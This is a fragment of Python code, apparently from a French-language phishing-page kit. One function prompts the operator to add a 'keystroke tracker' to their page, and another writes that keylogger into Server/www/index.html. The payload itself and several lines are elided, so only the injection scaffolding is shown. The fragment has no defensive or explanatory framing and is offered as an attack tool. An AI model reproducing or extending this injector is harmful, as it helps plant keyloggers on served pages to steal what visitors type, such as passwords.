...
def add_keylogger_prompt():
    ...
    print("\n{0}[{1}*{0}]{0}VEUX TU AJOUTER UN TRACKEUR DE TOUCHE A TA PAGE -{1}(Y/N)".format(default_palette[0], default_palette[4]))
    choice = input("\n\n{1}{0}TON CHOIX >>> {2}".format(default_palette[0], default_palette[4], default_palette[2])).upper()
    if choice == 'Y':
        add_keylogger()
    else:
        wait(1)
...
def add_keylogger():
    if path.exists('Server/www/index.html'):
        ...
        f.write(c)
        f.close()
        print("\n{0}[{1}#{0}]TRACKEUR DE TOUCHE{0} AJOUTÉ !!!".format(default_palette[0], default_palette[4]))
        wait(2)
    else:
